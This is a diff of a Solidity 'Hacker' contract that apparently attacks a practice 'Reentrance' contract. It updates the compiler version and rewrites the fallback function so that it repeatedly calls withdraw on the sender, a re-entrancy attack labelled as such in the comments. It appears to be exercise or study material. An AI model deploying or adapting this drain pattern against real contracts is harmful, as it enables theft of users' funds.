@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity >=0.6.0 <0.9.0;
+pragma solidity >=0.8.5 <0.9.0;
 
 import "./Reentrance.sol";
 
@@ -17,7 +17,7 @@ contract Hacker {
     _;
   }
 
-  constructor() public {
+  constructor() {
     hacker = payable(msg.sender);
   }
 
@@ -34,18 +34,15 @@ contract Hacker {
   }
 
   fallback() external payable {
-    /// @dev in practice no need to check the target's balance.
-    /// `call` will just returns false on insufficient ether, 
-    /// and the chain of transactions will be completed successfully
     // 2. Check target balance, if no more ether, stop attack
-    // if (address(targetContract).balance < (0.1 ether)) {
-    //   emit Stop(address(targetContract), address(this).balance);
+    // if (msg.sender.balance < (0.1 ether)) {
+    //   emit Stop(msg.sender, address(this).balance);
     //   return;
     // }
 
     // 3. Re-entrancy Attack
-    emit Reenter(address(targetContract), address(this).balance);
-    targetContract.withdraw(0.1 ether);
+    emit Reenter(msg.sender, address(this).balance);
+    Reentrance(payable(msg.sender)).withdraw(0.1 ether);
   }
 
   function kill() external onlyHacker {
